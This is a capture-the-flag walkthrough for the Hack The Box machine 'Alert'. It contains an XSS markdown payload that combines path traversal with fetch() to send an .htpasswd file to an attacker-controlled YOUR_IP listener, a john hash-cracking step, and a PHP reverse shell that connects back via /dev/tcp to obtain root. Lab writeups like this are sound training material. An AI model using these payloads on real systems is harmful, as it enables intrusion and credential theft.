✅ HTB: Alert — Full Writeup

Difficulty: Easy/Medium
Author: Mridul chamoli

1. Enumeration
1.1 Nmap Scan
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ nmap -sC -sV 10.10.11.44


Output (important parts):

22/tcp open  ssh  OpenSSH 8.2p1
80/tcp open  http Apache 2.4.41


Add to /etc/hosts:

thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ sudo nano /etc/hosts


Add:

10.10.11.44 alert.htb

2. Subdomain Enumeration
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ ffuf -u http://alert.htb/ -H "Host: FUZZ.alert.htb" \
-w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -ac


Found:

statistics.alert.htb


Add to hosts:

thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ sudo nano /etc/hosts


Add:

10.10.11.44 statistics.alert.htb

3. Foothold Through Markdown XSS → LFI → Exfiltration

Start a listener:

thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ python3 -m http.server 8888


Create malicious markdown:

thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ nano steal.md


Paste:

<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => { fetch("http://YOUR_IP:8888/?file_content=" + encodeURIComponent(data)); });
</script>


Upload → Copy share link → Submit in Contact Us form.

Your listener receives:

albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/

4. Crack Hash

Save hash:

thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ echo 'albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash.txt


Crack:

thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash.txt


John reveals:

albert : PASSWORD


SSH:

thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ ssh albert@alert.htb

5. Privilege Escalation
5.1 Upload & Run LinPEAS

On your machine:

thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ scp linpeas.sh albert@alert.htb:/tmp/linpeas.sh


On the box:

albert@alert:~$ bash /tmp/linpeas.sh


LinPEAS finds:

Local service running at localhost:8080

Writable directory:

/opt/website-monitor/config     (drwxrwxr-x root:albert)


This directory is executed by the internal website.

6. Root Shell via PHP RCE
6.1 Create Reverse Shell

On remote machine:

albert@alert:~$ nano /opt/website-monitor/config/shell.php


Paste:

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/1234 0>&1'");
?>

6.2 Port Forwarding

Back on your Kali:

thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ ssh -L 8080:127.0.0.1:8080 albert@alert.htb

6.3 Start Listener
thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ nc -lvnp 1234

6.4 Trigger the reverse shell

Open browser:

http://127.0.0.1:8080/config/shell.php


Your terminal catches:

thanatos@kali:/home/thanatos/Desktop/htb/machines/alert$ id
uid=0(root) gid=0(root)


ROOT ACCESS.

7. Flags
cat /home/albert/user.txt
cat /root/root.txt
